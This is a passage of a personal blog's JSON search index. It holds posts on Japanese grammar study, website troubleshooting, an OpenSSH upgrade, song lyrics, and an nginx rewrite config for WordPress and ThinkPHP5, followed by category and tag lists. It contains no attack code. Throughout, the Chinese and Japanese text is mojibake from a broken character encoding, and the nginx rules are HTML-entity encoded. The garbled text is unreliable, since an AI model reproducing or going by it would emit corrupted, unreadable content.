ãŒï¼ˆè¡¨ç¤ºç„¦ç‚¹ï¼‰+ çŠ¶æ…‹å‹•è© ä¾‹ï¼šæ—¥æœ¬èªãŒåˆ†ã‹ã‚Šã¾ã™&emsp;&emsp;ç§ã¯ãŠé‡‘ãŒå…¨ç„¶ã‚ã‚Šã¾ã›ã‚“ æ™‚åˆ¶ - è‚¯å®š å¦å®š ç¾åœ¨ ã€œã¾ã™ ã€œã¾ã›ã‚“ éå» ã€œã¾ã—ãŸ ã€œã¾ã›ã‚“ã§ã—ãŸ èªæ°— ã¾ã›ã‚“ã‹è¦ä¸è¦ ä¾‹ï¼šä¸€ç·’ã«[å‹•è©]ã¾ã›ã‚“ã‹&emsp;&emsp;ãˆãˆã€[ ]ã¾ã—ã‚‡ã†&emsp;&emsp;ã™ã¿ã¾ã›ã‚“ã€ã¡ã‚‡ã£ã¨â€¦ ãã®ä»– æ­©ã„ã¦èµ°è·¯å» æ€»æ˜¯ ã„ã¤ã‚‚ ç»å¸¸ ã‚ˆã æœ‰æ—¶å€™ æ™‚ã€… ä¸å¸¸ ã‚ã¾ã‚Šï¼¿ï¼¿ã¾ã›ã‚“ å®Œå…¨ä¸ å…¨ç„¶ï¼¿ï¼¿ã¾ã›ã‚“ ç†ç”±åŸå› ã‹ã‚‰ã€ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ä¾‹ï¼šãŠé‡‘ãŒã‚ã‚Šã¾ã›ã‚“ã‹ã‚‰ã€ã©ã“ã‚‚è¡ŒããŸããªã„ã§ã™&emsp;&emsp;æ—¥æœ¬ã®ã‚¢ãƒ‹ãƒ¡ãŒå¥½ãã§ã™ã‹ã‚‰ã€æ—¥æœ¬èªã‚’å‹‰å¼·ã—ã¾ã™&emsp;&emsp;aï¼šã©ã†ã—ã¦ã€æ˜¨æ—¥ã€å­¦æ ¡ã¸æ¥ã¾ã›ã‚“ã§ã™ã‹&emsp;&emsp;bï¼šç–²ã‚Œã¾ã—ãŸã‹ã‚‰ ã‚‚ã† å·²ç»ä¾‹ï¼šã‚‚ã†æ™©ã”é£¯ã‚’é£Ÿã¹ã¾ã—ãŸã‹&emsp;&emsp;ã¯ã„ã€ã‚‚ã†é£Ÿã¹ã¾ã—ãŸ&emsp;&emsp;ã„ã„ãˆã€ã¾ã ã§ã™&emsp;&emsp;20æ™‚ã§ã™ã­ã€ã‚‚ã†å¸°ã‚Šã¾ã™&emsp;&emsp;aï¼šã‚‚ã†ã‚ã®æ˜ ç”»ã‚’è¦‹ã¾ã—ãŸã‹&emsp;&emsp;bï¼šã„ã„ãˆã€ã¾ã ã§ã™ã€‚æ˜æ—¥å‹é”ã¨è¦‹ã¾ã™&emsp;&emsp;aï¼š21æ™‚ã§ã™ã‚ˆã€å¸°ã‚Šã¾ã›ã‚“ã‹&emsp;&emsp;bï¼šãã†ã§ã™ã­ã€å¸°ã‚Šã¾ã—ã‚‡ã†","categories":[{"name":"å‹‰å¼·","slug":"å‹‰å¼·","permalink":"https://tari.moe/categories/%E5%8B%89%E5%BC%B7/"}],"tags":[{"name":"å‹‰å¼·","slug":"å‹‰å¼·","permalink":"https://tari.moe/tags/%E5%8B%89%E5%BC%B7/"}]},{"title":"some issue","slug":"some_issue","date":"2019-06-27T07:53:50.000Z","updated":"2021-04-02T02:18:10.721Z","comments":true,"path":"2019/06/27/some_issue/","link":"","permalink":"https://tari.moe/2019/06/27/some_issue/","excerpt":"","text":"å®˜ç½‘è®¿é—®ç›¸å…³æ£€æŸ¥å†…å¤–ç½‘, vpnæƒ…å†µä¸‹çš„è®¿é—®æƒ…å†µ, ä»¥æ­¤æ¥ç²—ç•¥åˆ¤æ–­æ˜¯å¦ä¸ºwafæ‹¦æˆª[æ¡ˆä¾‹1]: å®˜ç½‘å¤–ç½‘æ— æ³•è®¿é—®, å†…ç½‘å¯ä»¥æˆ–vpnå¯ä»¥, è¯´æ˜ç½‘ç«™æ²¡æœ‰é—®é¢˜, å¯ä»¥æ¨æµ‹ä¸‹æ˜¯wafæ‹¦æˆª æ£€æŸ¥118 119 120çš„é€šä¿¡æƒ…å†µ(ping)[æ¡ˆä¾‹2]: è®¿é—®ç½‘ç«™å‡ºç°500é”™è¯¯, é€šè¿‡pingå‘ç°120æ— æ³•é€šä¿¡ï¼Œä¹Ÿè¿›ä¸äº†shellï¼Œ ç™»é™†vsphereå‘ç°æ˜¯é›†ç¾¤çš„å…±äº«å­˜å‚¨æ»¡äº† æ£€æŸ¥ å†…å­˜, cpuä½¿ç”¨æƒ…å†µ(top)[æ¡ˆä¾‹3]: å®˜ç½‘ä¸»é¡µä¸Šä¸å», ç™»é™†118åå‘ç°æœ‰ä¸ªç¨‹åºè·‘æ»¡äº†cpu, ä½¿ç”¨killå‘½ä»¤æ€æ‰ç›¸å…³è¿›ç¨‹(killå‰å…ˆç¡®è®¤ä¸‹è¿›ç¨‹ç”¨é€”) æ£€æŸ¥nginx,php-fpmçš„è¿è¡Œæƒ…å†µ(ps -aux| grep xxx)æ£€æŸ¥ ç¡¬ç›˜ä½¿ç”¨æƒ…å†µ (df -hæˆ–vshpere)æŸ¥çœ‹ nginx, phpæ—¥å¿—æ–‡ä»¶å°è¯•å¯¹nginx ,php-fpmé‡å¯å°è¯•å¯¹æœåŠ¡å™¨é‡å¯å¦‚æœxshell æ— æ³•è¿æ¥æœåŠ¡å™¨, ç™»é™†vsphere æ£€æŸ¥æœåŠ¡å™¨å‚¨å­˜ç©ºé—´æ˜¯å¦å·²æ»¡ æŒ‚è½½ç›¸å…³å®˜ç½‘ä¸Šä¼ æ–‡ä»¶å¤±è´¥, å›¾ç‰‡ä¸æ˜¾ç¤º, /wp-content/uploads/æ— æ³•å»ºç«‹ç›®å½•ç­‰ä¸æŒ‚è½½æ–‡ä»¶å¤¹(ä¸€èˆ¬æ˜¯uploadsæ–‡ä»¶å¤¹)ä¸‹çš„æ–‡ä»¶ç›¸å…³çš„é—®é¢˜æ£€æŸ¥119çš„æ–‡ä»¶æŒ‚è½½æ˜¯å¦æˆåŠŸ(showmount -e)è‹¥æ²¡æŒ‚è½½æˆåŠŸ, é‡å¯æœåŠ¡å™¨å¦‚æœè¦å¯¹/wp-content/uploads/çš„æ–‡ä»¶è¿›è¡Œæƒé™ç›¸å…³çš„æ“ä½œ,éœ€è¦åœ¨119ä¸Šè¿›è¡Œå¤„ç†, 118ä¸Šæ— æ³•è¿›è¡Œ æ¢å¤å¿«ç…§ç›¸å…³åˆšåˆšå¿«ç…§æ¢å¤å, å¯èƒ½ä¼šé‡è§ç½‘ç«™éƒ¨åˆ†åŠŸèƒ½å¤±æ•ˆ,éƒ¨åˆ†é¡µé¢æ— æ³•è®¿é—®, å¯èƒ½æ˜¯æ–‡ä»¶æŒ‚è½½æˆ–æ•°æ®åº“è¿æ¥æ²¡æœ‰å®Œå…¨æ¢å¤, å»ºè®®ç­‰å¾…30min~1håå†æŸ¥çœ‹ç½‘ç«™æ˜¯å¦æ­£å¸¸, å†è¿›è¡Œä¸‹ä¸€æ­¥æ“ä½œæ’æŸ¥é—®é¢˜. å¿«ç…§æ¢å¤å’Œé‡å¯å¯¹å®˜ç½‘è®¿é—®ä¼šé€ æˆä¸€å®šå½±å“, æ¶‰åŠåˆ°è¿™ç±»çš„æ“ä½œåšå¥½æ™šä¸Šè¿›è¡Œ","categories":[{"name":"è¿ç»´","slug":"è¿ç»´","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/"}],"tags":[{"name":"è¿ç»´","slug":"è¿ç»´","permalink":"https://tari.moe/tags/%E8%BF%90%E7%BB%B4/"}]},{"title":"Openssh upgrade, from 7.5 to 7.9","slug":"Openssh upgrade, from 7.5 to 7.9","date":"2019-06-24T02:54:44.000Z","updated":"2021-04-02T02:17:25.615Z","comments":true,"path":"2019/06/24/Openssh upgrade, from 7.5 to 7.9/","link":"","permalink":"https://tari.moe/2019/06/24/Openssh%20upgrade,%20from%207.5%20to%207.9/","excerpt":"","text":"è®°ä¸€æ¬¡OpenSSHå‡çº§è¿‡ç¨‹ç³»ç»Ÿç¯å¢ƒ: Ubuntu14.04 å¦‚æœæœåŠ¡å™¨å¹¶éé‡‡ç”¨äº‘è™šæ‹Ÿå¹³å°ï¼Œæœ€å¥½å…ˆå¯ç”¨å¹¶æµ‹è¯•SSHä»¥å¤–çš„è¿æ¥æ–¹å¼ï¼ˆå¦‚Telnetï¼‰æ˜¯å¦èƒ½å¤Ÿæ­£å¸¸ä½¿ç”¨ï¼Œå¦‚æœSSHå®‰è£…å¤±è´¥ä¼šè¿ä¸ä¸ŠæœåŠ¡å™¨ï¼ˆåˆ«é—®æˆ‘æ€ä¹ˆçŸ¥é“çš„â€¦ï¼‰ åˆ é™¤æ—§ç‰ˆæœ¬çš„opensshç‰ˆæœ¬æ–‡ä»¶åŠæ—§ç‰ˆæœ¬çš„opensslï¼ˆ1ã€è®°å¾—å…ˆå¤‡ä»½å¥½ 2ã€å¦‚æœzlibç‰ˆæœ¬é€‚åº”å½“å‰ç‰ˆæœ¬OpenSSHï¼Œå¯ä»¥ä¸ç”¨æ›´æ–°ï¼‰ Wget openssh7.9p1ã€openssl1.1.1 å’Œ perl5.26å®‰è£…åŒ… å…ˆç¼–è¯‘å®‰è£…perl,è®°å¾—å¤‡ä»½æ—§çš„perlï¼Œå†åˆ›é€ æ–°çš„è½¯é“¾æ¥Perl -vè¿›è¡Œæµ‹è¯• ç¼–è¯‘å®‰è£…opensslï¼Œopenssl versionæµ‹è¯•ä¸æˆåŠŸåˆ°binç›®å½•ä¸‹./openssl versionï¼ŒæŠ¥æ–‡ä»¶åŠ è½½å‡ºé”™å¤‡ä»½å¹¶é‡æ–°åˆ›å»ºæ–°çš„libssl.so.1.1å’Œlibcrypto.so.1.1è½¯é“¾æ¥å†æ¬¡binç›®å½•ä¸‹./openssl versionæˆåŠŸå¤‡ä»½å¹¶åˆ›å»ºæ–°çš„opensslè½¯é“¾æ¥Openssl versionè¿›è¡Œæµ‹è¯• ç¼–è¯‘å®‰è£…openssh ä¿®æ”¹sshé…ç½®æ–‡ä»¶å…è®¸rootç”¨æˆ·ç™»å½•","categories":[{"name":"è¿ç»´","slug":"è¿ç»´","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/"}],"tags":[{"name":"è¿ç»´","slug":"è¿ç»´","permalink":"https://tari.moe/tags/%E8%BF%90%E7%BB%B4/"}]},{"title":"ã‚´ãƒ¼ã‚¹ãƒˆãƒ«ãƒ¼ãƒ«","slug":"ã‚´ãƒ¼ã‚¹ãƒˆãƒ«ãƒ¼ãƒ«","date":"2019-06-24T02:33:33.000Z","updated":"2021-04-02T02:19:36.940Z","comments":true,"path":"2019/06/24/ã‚´ãƒ¼ã‚¹ãƒˆãƒ«ãƒ¼ãƒ«/","link":"","permalink":"https://tari.moe/2019/06/24/%E3%82%B4%E3%83%BC%E3%82%B9%E3%83%88%E3%83%AB%E3%83%BC%E3%83%AB/","excerpt":"","text":"â€˜ãƒ¡ãƒ¼ãƒ‡ãƒ¼â€™ã®æ„å‘³ã“ã®å‰ã€ã‚´ãƒ¼ã‚¹ãƒˆãƒ«ãƒ¼ãƒ«ã‚’è´ãã¾ã—ãŸã€ãã®æ­Œè©ã®ä¸­ â€™ãƒ¡ãƒ¼ãƒ‡ãƒ¼â€™ ãŒã‚ã‚Šã¾ã™ã©ã†ã„ã†æ„å‘³ãªã®ã‹ï¼Ÿ ãã®æ„å‘³ã«ã¤ã„ã¦è€ƒãˆãŒã‚ã‚Šã¾ã™ã€‚ ã‚°ãƒ¼ã‚°ãƒ«ã§ã€ã“ã®ã‚ˆã†ãªè¨€è‘‰ãŒã‚ã‚‹ï¼šMayday is an emergency procedure word used internationally as a distress signal in voice-procedure radio communications. é­é›£ä¿¡å·ã®ã“ã¨ã§ã™ã‹ï¼Ÿã‚¨ã‚¨ã‚¨ã‚¨ã‚¨ã€ã€å…¨ç„¶åˆ†ã‹ã‚‰ãªã„ æœ€å¾Œã«ã“ã®ãƒªãƒ³ã‚¯ã‚’è¦‹ã¤ã‘ã¾ã—ãŸ ã‚´ãƒ¼ã‚¹ãƒˆãƒ«ãƒ¼ãƒ«æ­Œè©ã®æ„å‘³ã¤ã¾ã‚Šã€ä¸»äººå…¬ã¯é­é›£ã—ã¦ã„ã¦ã€ã ã‚Œã‹ã«è¦‹ã¤ã‘ã¦ã‚‚ã‚‰ã„ãŸã„ã¨ä¿¡å·ã‚’é€ã£ã¦ã„ã‚‹ã®ã§ã™ã€‚ ãã‚“ãªé­é›£ä¿¡å·ã‚’é€ã£ã¦ãŠããªãŒã‚‰ã€åƒ•ã¯è¦‹ã¤ã‘ã‚‰ã‚Œã¦ã‚‚æŠ±ãç· ã‚ãªãã¦ã„ã„ã¨è¨€ã£ã¦ã„ã¾ã™ã€‚ ä¸€æ–¹ã§ã€åƒ•ã«æ°—ã¥ã„ãŸã‚‰ç¬‘ã„ã‹ã‘ã¦æ¬²ã—ã„ã¨é¡˜ã£ã¦ã„ã¾ã™ã€‚ ã“ã‚Œã¯ã€åƒ•ãŒæŠ±ãã—ã‚ã‚‹ã“ã¨ã®ã§ããªã„å­˜åœ¨ã ã¨ã„ã†ã“ã¨ã‚’è¨€ã£ã¦ã„ã‚‹ã®ã§ã¯ãªã„ã§ã—ã‚‡ã†ã‹ï¼Ÿ","categories":[{"name":"å°è®°","slug":"å°è®°","permalink":"https://tari.moe/categories/%E5%B0%8F%E8%AE%B0/"}],"tags":[{"name":"å°è®°","slug":"å°è®°","permalink":"https://tari.moe/tags/%E5%B0%8F%E8%AE%B0/"}]},{"title":"Deploy WordPress, ThinkPHP5 and general system in Nginx","slug":"maintence","date":"2019-06-23T16:01:51.000Z","updated":"2021-04-02T02:28:01.006Z","comments":true,"path":"2019/06/24/maintence/","link":"","permalink":"https://tari.moe/2019/06/24/maintence/","excerpt":"","text":"è®°ä¸€æ¬¡Nginxä¸ŠåŒæ—¶éƒ¨ç½²WordPressã€ ThinkPHP5 å’Œ æ™®é€šç³»ç»Ÿï¼Œå…¶ä¸­WordPressä½¿ç”¨ç›®å½•å¤šç«™ç‚¹è¿™æ¬¡ç³»ç»Ÿéƒ¨ç½²ä¸»è¦é‡åˆ°ä»¥ä¸‹å››ä¸ªé—®é¢˜ï¼Œä»¥è‡³äºèŠ±è´¹æ¯”è¾ƒé•¿çš„æ—¶é—´ï¼Œä½†æ€»çš„æ¥è¯´è¿˜æ˜¯å› ä¸ºå¯¹nginxé…ç½®ç›¸å¯¹ä¸ç†Ÿç»ƒã€‚ wordpressæœ¬èº«è·¯ç”±ç‰¹ç‚¹ï¼Œwordpressåœ¨å»ºç«™æ—¶ä¼šæŠŠç½‘ç«™çš„æ ¹åœ°å€å­˜åœ¨æ•°æ®åº“çš„wp_optionsè¡¨çš„siteurlã€homeã€ossdl_off_cdn_urlå’Œossdl_off_blog_urlå­—æ®µä¸­ï¼Œè·¯ç”±éƒ½æ˜¯ä»æ•°æ®åº“ä¸­è¯»å–ã€‚æ‰€ä»¥nginxæ— è®ºæ€ä¹ˆä¿®æ”¹é…ç½®éƒ½æ˜¯æµ‹è¯•ä¸äº†é—®é¢˜çš„ã€‚ wordpressåŸŸåå¤šç«™ç‚¹ä¸ç›®å½•å¤šç«™ç‚¹å­˜åœ¨ç€ä¸åŒä¹‹å¤„ï¼Œå®‰è£…wpç›®å½•å¤šç«™ç‚¹æ—¶ï¼Œå¿…é¡»è¦åœç”¨æ‰€æœ‰æ’ä»¶å†å¼€å¯ã€‚ wpç›®å½•å¤šç«™ç‚¹çš„é‡å†™è§„åˆ™ï¼Œç”±äºwpè·¯ç”±çš„ç‰¹æ®Šæ€§ï¼Œwpåœ¨nginxçš„é…ç½®ä¼šè¦†ç›–å…¶ä»–ç³»ç»Ÿçš„é…ç½®ï¼Œæ‰€ä»¥è®¿é—®uriæ—¶å¿…é¡»é¦–å…ˆé‡å†™å…¶ä»–ç³»ç»Ÿçš„uriã€‚åˆç”±äºå­˜åœ¨wpï¼Œtp5ï¼Œä»¥åŠåŸç”Ÿç³»ç»Ÿï¼Œä¸‰ç§ä¸åŒè·¯ç”±çš„è§„åˆ™ï¼Œä¸€å¼€å§‹æœåŠ¡å™¨é…ç½®åˆç»è¿‡è®¸å¤šäººæ‰‹ï¼Œé…ç½®èµ·æ¥æ¯”è¾ƒå‡Œä¹±ã€‚ ç”±äºåœ¨ç¼–è¯‘å®‰è£…nginxæ—¶ï¼Œæ²¡æœ‰è£…ä¸Šechoè¾“å‡ºï¼Œåœ¨æˆ‘ä»¬è°ƒè¯•æ­£åˆ™è¡¨è¾¾å¼è§„åˆ™é‡å†™uriæ—¶å€™å¸¦æ¥äº†å¾ˆå¤šéº»çƒ¦ï¼Œéœ€è¦æ”¹ä¸åŒçš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œç„¶åæŸ¥çœ‹logæ–‡ä»¶ï¼Œç«™ç‚¹è®¿é—®æƒ…å†µç­‰æ‘¸ç´¢å®ƒçš„é‡å†™è§„å¾‹ã€‚ ä»¥ä¸‹æ˜¯é…ç½®æ–‡ä»¶å†…å®¹:RoomReserver æ˜¯æ™®é€šç³»ç»Ÿï¼Œtpmasæ˜¯ThinkPHP5ç³»ç»Ÿ12345678910111213141516171819202122232425#RoomResever rewrite rulerewrite ^&#x2F;RoomReserve&#x2F;(.*)$ &#x2F;RoomReserve&#x2F;$1 break;#tpmas rewrite ruleif ( $request_uri ~* &#x2F;tpmas&#x2F; ) &#123; rewrite ^&#x2F;tpmas&#x2F;public&#x2F;index.php&#x2F;(.*)$ &#x2F;tpmas&#x2F;public&#x2F;index.php?s&#x3D;&#x2F;$1 last; break; #rewrite ^&#x2F;tpmas&#x2F;public&#x2F;index.php&#x2F;(.*)$ &#x2F;tpmas&#x2F;public&#x2F;index.php?s&#x3D;&#x2F;$1 last; break;&#125;#wordpress rewrite rulerewrite ^&#x2F;([_0-9a-zA-Z-]+&#x2F;)?wp-admin$ &#x2F;$1wp-admin&#x2F; permanent;if (-f $request_filename)&#123;set $rule_2 1;&#125;if (-d $request_filename)&#123;set $rule_2 1;&#125;if ($rule_2 &#x3D; &quot;1&quot;)&#123;#ignored: â€œ-â€ thing used or unknown variable in regex&#x2F;rew&#125;rewrite ^&#x2F;([_0-9a-zA-Z-]+&#x2F;)?(wp-(content|admin|includes).*) &#x2F;$2 last;rewrite ^&#x2F;([_0-9a-zA-Z-]+&#x2F;)?(.*.php)$ &#x2F;$2 last;rewrite &#x2F;. &#x2F;index.php last;","categories":[{"name":"è¿ç»´","slug":"è¿ç»´","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/"},{"name":"Wordpress","slug":"è¿ç»´/Wordpress","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/Wordpress/"}],"tags":[{"name":"è¿ç»´","slug":"è¿ç»´","permalink":"https://tari.moe/tags/%E8%BF%90%E7%BB%B4/"},{"name":"Wordpress","slug":"Wordpress","permalink":"https://tari.moe/tags/Wordpress/"}]},{"title":"Hello World","slug":"hello-world","date":"2019-06-22T16:23:37.000Z","updated":"2021-04-01T08:25:34.475Z","comments":true,"path":"2019/06/23/hello-world/","link":"","permalink":"https://tari.moe/2019/06/23/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]}],"categories":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/categories/ctf/"},{"name":"æ¯”èµ›","slug":"ctf/æ¯”èµ›","permalink":"https://tari.moe/categories/ctf/%E6%AF%94%E8%B5%9B/"},{"name":"ctfshow","slug":"ctf/ctfshow","permalink":"https://tari.moe/categories/ctf/ctfshow/"},{"name":"ctfç»ƒä¹ ","slug":"ctf/ctfshow/ctfç»ƒä¹ ","permalink":"https://tari.moe/categories/ctf/ctfshow/ctf%E7%BB%83%E4%B9%A0/"},{"name":"hackme","slug":"ctf/hackme","permalink":"https://tari.moe/categories/ctf/hackme/"},{"name":"ctfç»ƒä¹ ","slug":"ctf/hackme/ctfç»ƒä¹ ","permalink":"https://tari.moe/categories/ctf/hackme/ctf%E7%BB%83%E4%B9%A0/"},{"name":"SDL","slug":"SDL","permalink":"https://tari.moe/categories/SDL/"},{"name":"å¨èƒå»ºæ¨¡","slug":"SDL/å¨èƒå»ºæ¨¡","permalink":"https://tari.moe/categories/SDL/%E5%A8%81%E8%83%81%E5%BB%BA%E6%A8%A1/"},{"name":"æµé‡åˆ†æ","slug":"æµé‡åˆ†æ","permalink":"https://tari.moe/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"name":"Wireshark","slug":"æµé‡åˆ†æ/Wireshark","permalink":"https://tari.moe/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/Wireshark/"},{"name":"MISC","slug":"æµé‡åˆ†æ/Wireshark/MISC","permalink":"https://tari.moe/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/Wireshark/MISC/"},{"name":"æ€»ç»“","slug":"æ€»ç»“","permalink":"https://tari.moe/categories/%E6%80%BB%E7%BB%93/"},{"name":"å°è®°","slug":"æ€»ç»“/å°è®°","permalink":"https://tari.moe/categories/%E6%80%BB%E7%BB%93/%E5%B0%8F%E8%AE%B0/"},{"name":"å¼€å‘","slug":"å¼€å‘","permalink":"https://tari.moe/categories/%E5%BC%80%E5%8F%91/"},{"name":"Python","slug":"å¼€å‘/Python","permalink":"https://tari.moe/categories/%E5%BC%80%E5%8F%91/Python/"},{"name":"Django","slug":"å¼€å‘/Python/Django","permalink":"https://tari.moe/categories/%E5%BC%80%E5%8F%91/Python/Django/"},{"name":"å­¦æ ¡è¯¾ç¨‹","slug":"å­¦æ ¡è¯¾ç¨‹","permalink":"https://tari.moe/categories/%E5%AD%A6%E6%A0%A1%E8%AF%BE%E7%A8%8B/"},{"name":"å°è®°","slug":"å°è®°","permalink":"https://tari.moe/categories/%E5%B0%8F%E8%AE%B0/"},{"name":"å…¥é—¨","slug":"ctf/å…¥é—¨","permalink":"https://tari.moe/categories/ctf/%E5%85%A5%E9%97%A8/"},{"name":"è¿ç»´","slug":"è¿ç»´","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/"},{"name":"Wordpress","slug":"è¿ç»´/Wordpress","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/Wordpress/"},{"name":"Wordpress","slug":"å¼€å‘/Wordpress","permalink":"https://tari.moe/categories/%E5%BC%80%E5%8F%91/Wordpress/"},{"name":"Nginx","slug":"è¿ç»´/Nginx","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/Nginx/"},{"name":"å‹‰å¼·","slug":"å‹‰å¼·","permalink":"https://tari.moe/categories/%E5%8B%89%E5%BC%B7/"},{"name":"ansible","slug":"è¿ç»´/ansible","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/ansible/"},{"name":"æ—¥å¸¸æŠ˜è…¾","slug":"æ—¥å¸¸æŠ˜è…¾","permalink":"https://tari.moe/categories/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/"},{"name":"Motrix","slug":"æ—¥å¸¸æŠ˜è…¾/Motrix","permalink":"https://tari.moe/categories/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/Motrix/"},{"name":"aria2","slug":"æ—¥å¸¸æŠ˜è…¾/Motrix/aria2","permalink":"https://tari.moe/categories/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/Motrix/aria2/"},{"name":"SSH","slug":"è¿ç»´/SSH","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/SSH/"},{"name":"vsftpd","slug":"è¿ç»´/vsftpd","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/vsftpd/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/tags/ctf/"},{"name":"æ¯”èµ›","slug":"æ¯”èµ›","permalink":"https://tari.moe/tags/%E6%AF%94%E8%B5%9B/"},{"name":"ctfç»ƒä¹ ","slug":"ctfç»ƒä¹ ","permalink":"https://tari.moe/tags/ctf%E7%BB%83%E4%B9%A0/"},{"name":"ctfshow","slug":"ctfshow","permalink":"https://tari.moe/tags/ctfshow/"},{"name":"hackme","slug":"hackme","permalink":"https://tari.moe/tags/hackme/"},{"name":"SDL","slug":"SDL","permalink":"https://tari.moe/tags/SDL/"},{"name":"å¨èƒå»ºæ¨¡","slug":"å¨èƒå»ºæ¨¡","permalink":"https://tari.moe/tags/%E5%A8%81%E8%83%81%E5%BB%BA%E6%A8%A1/"},{"name":"æµé‡åˆ†æ","slug":"æµé‡åˆ†æ","permalink":"https://tari.moe/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"name":"Wireshark","slug":"Wireshark","permalink":"https://tari.moe/tags/Wireshark/"},{"name":"MISC","slug":"MISC","permalink":"https://tari.moe/tags/MISC/"},{"name":"å°è®°","slug":"å°è®°","permalink":"https://tari.moe/tags/%E5%B0%8F%E8%AE%B0/"},{"name":"æ€»ç»“","slug":"æ€»ç»“","permalink":"https://tari.moe/tags/%E6%80%BB%E7%BB%93/"},{"name":"å¼€å‘","slug":"å¼€å‘","permalink":"https://tari.moe/tags/%E5%BC%80%E5%8F%91/"},{"name":"Python","slug":"Python","permalink":"https://tari.moe/tags/Python/"},{"name":"Django","slug":"Django","permalink":"https://tari.moe/tags/Django/"},{"name":"å­¦æ ¡è¯¾ç¨‹","slug":"å­¦æ ¡è¯¾ç¨‹","permalink":"https://tari.moe/tags/%E5%AD%A6%E6%A0%A1%E8%AF%BE%E7%A8%8B/"},{"name":"å…¥é—¨","slug":"å…¥é—¨","permalink":"https://tari.moe/tags/%E5%85%A5%E9%97%A8/"},{"name":"è¿ç»´","slug":"è¿ç»´","permalink":"https://tari.moe/tags/%E8%BF%90%E7%BB%B4/"},{"name":"Wordpress","slug":"Wordpress","permalink":"https://tari.moe/tags/Wordpress/"},{"name":"Nginx","slug":"Nginx","permalink":"https://tari.moe/tags/Nginx/"},{"name":"å‹‰å¼·","slug":"å‹‰å¼·","permalink":"https://tari.moe/tags/%E5%8B%89%E5%BC%B7/"},{"name":"ansible","slug":"ansible","permalink":"https://tari.moe/tags/ansible/"},{"name":"æ—¥å¸¸æŠ˜è…¾","slug":"æ—¥å¸¸æŠ˜è…¾","permalink":"https://tari.moe/tags/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/"},{"name":"Motrix","slug":"Motrix","permalink":"https://tari.moe/tags/Motrix/"},{"name":"aria2","slug":"aria2","permalink":"https://tari.moe/tags/aria2/"},{"name":"SSH","slug":"SSH","permalink":"https://tari.moe/tags/SSH/"},{"name":"vsftpd","slug":"vsftpd","permalink":"https://tari.moe/tags/vsftpd/"}]}